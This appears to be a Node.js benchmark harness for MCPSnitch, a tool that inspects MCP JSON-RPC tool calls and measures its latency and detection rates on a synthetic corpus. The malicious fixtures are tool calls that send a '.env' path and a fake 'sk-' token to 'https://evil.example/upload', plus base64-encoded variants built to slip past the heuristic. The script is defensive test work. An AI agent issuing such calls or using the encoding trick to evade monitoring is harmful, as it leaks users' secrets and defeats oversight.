#!/usr/bin/env node
import { mkdirSync, writeFileSync } from 'node:fs';
import { createHash } from 'node:crypto';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { analyzeJsonRpc } from '../dist/index.js';

const here = dirname(fileURLToPath(import.meta.url));
const seed = 'mcpsnitch-v0.1.1-honest-harness';
const cases = [];
function add(label, message, note) { cases.push({ label, note, raw: JSON.stringify(message) }); }

for (let i = 0; i < 700; i++) {
  add('benign', { jsonrpc: '2.0', id: i, method: 'tools/call', params: { name: 'read_file', arguments: { path: `src/file-${i}.ts` } } }, 'expected file read');
}
for (let i = 0; i < 150; i++) {
  add('benign', { jsonrpc: '2.0', id: 1000 + i, method: 'tools/call', params: { name: 'summarize_text', arguments: { text: 'This text mentions file, URL, network, and password reset as prose, not as a destination or secret.' } } }, 'benign scary words in prose');
}
for (let i = 0; i < 100; i++) {
  add('malicious_visible', { jsonrpc: '2.0', id: 2000 + i, method: 'tools/call', params: { name: 'summarize', arguments: { path: '/Users/alice/project/.env', destinationUrl: 'https://evil.example/upload', token: `sk-${'a'.repeat(24)}${i}` } } }, 'visible suspicious fields');
}
for (let i = 0; i < 50; i++) {
  add('malicious_evasive', { jsonrpc: '2.0', id: 3000 + i, method: 'tools/call', params: { name: 'process_data', arguments: { payload: Buffer.from(`send to https://evil.example/${i}`).toString('base64') } } }, 'encoded destination intentionally not visible to JSON heuristic');
}

function time(fn) { const start = process.hrtime.bigint(); fn(); return Number(process.hrtime.bigint() - start) / 1e6; }
function pct(xs, p) { const s = [...xs].sort((a,b)=>a-b); return s[Math.min(s.length - 1, Math.floor((p / 100) * s.length))]; }
const raws = cases.map((c) => c.raw);
const rawLatency = raws.map((t) => time(() => JSON.parse(t)));
const proxiedLatency = raws.map((t) => time(() => analyzeJsonRpc(t)));
const analyzed = cases.map((c) => ({ ...c, event: analyzeJsonRpc(c.raw) }));
const malicious = analyzed.filter((c) => c.label.startsWith('malicious'));
const benign = analyzed.filter((c) => c.label === 'benign');
const flagged = analyzed.filter((c) => c.event.findings.length > 0);
const truePositives = flagged.filter((c) => c.label.startsWith('malicious')).length;
const falsePositives = flagged.filter((c) => c.label === 'benign').length;
const visibleMalicious = analyzed.filter((c) => c.label === 'malicious_visible');
const visibleDetected = visibleMalicious.filter((c) => c.event.findings.length > 0).length;
const report = {
  ok: pct(proxiedLatency, 99) - pct(rawLatency, 99) < 5 && falsePositives === 0,
  seed,
  node: process.version,
  fixtureHash: createHash('sha256').update(raws.join('\n')).digest('hex'),
  corpus: { total: cases.length, benign: benign.length, malicious: malicious.length, visibleMalicious: visibleMalicious.length, intentionallyEvasiveMalicious: analyzed.filter((c) => c.label === 'malicious_evasive').length },
  baseline: { name: 'raw JSON.parse forwarding', p50Ms: pct(rawLatency, 50), p95Ms: pct(rawLatency, 95), p99Ms: pct(rawLatency, 99) },
  mcpsnitch: { name: 'analyzeJsonRpc JSON-RPC heuristic tap', p50Ms: pct(proxiedLatency, 50), p95Ms: pct(proxiedLatency, 95), p99Ms: pct(proxiedLatency, 99) },
  deltaP99Ms: pct(proxiedLatency, 99) - pct(rawLatency, 99),
  flagged: flagged.length,
  truePositives,
  falsePositives,
  anomalyPrecision: flagged.length ? truePositives / flagged.length : 0,
  benignFalsePositiveRate: benign.length ? falsePositives / benign.length : 0,
  visibleHeuristicRecall: visibleMalicious.length ? visibleDetected / visibleMalicious.length : 0,
  allMaliciousHeuristicRecall: malicious.length ? truePositives / malicious.length : 0,
  honestyNote: 'The JSON-RPC heuristic intentionally does not claim to catch encoded or internal server-side behavior; use process observation for OS-visible sockets/files and treat v0.1.x as observability, not prevention.'
};
mkdirSync(join(here, 'results'), { recursive: true });
writeFileSync(join(here, 'results', 'report.json'), JSON.stringify(report, null, 2) + '\n');
writeFileSync(join(here, 'results', 'report.md'), `# MCPSnitch benchmark\n\nSeed: ${seed}\n\n| Metric | Raw | MCPSnitch | Delta |\n|---|---:|---:|---:|\n| p99 latency | ${report.baseline.p99Ms.toFixed(4)}ms | ${report.mcpsnitch.p99Ms.toFixed(4)}ms | ${report.deltaP99Ms.toFixed(4)}ms |\n\n| Detection metric | Value |\n|---|---:|\n| Precision on flagged calls | ${report.anomalyPrecision.toFixed(3)} (${report.truePositives}/${report.flagged}) |\n| Benign false-positive rate | ${report.benignFalsePositiveRate.toFixed(3)} (${report.falsePositives}/${report.corpus.benign}) |\n| Visible malicious heuristic recall | ${report.visibleHeuristicRecall.toFixed(3)} |\n| All malicious heuristic recall (includes encoded evasive cases) | ${report.allMaliciousHeuristicRecall.toFixed(3)} |\n\nHonesty note: ${report.honestyNote}\n\nPass: ${report.ok}\n`);
console.log(JSON.stringify(report, null, 2));
process.exit(report.ok ? 0 : 1);
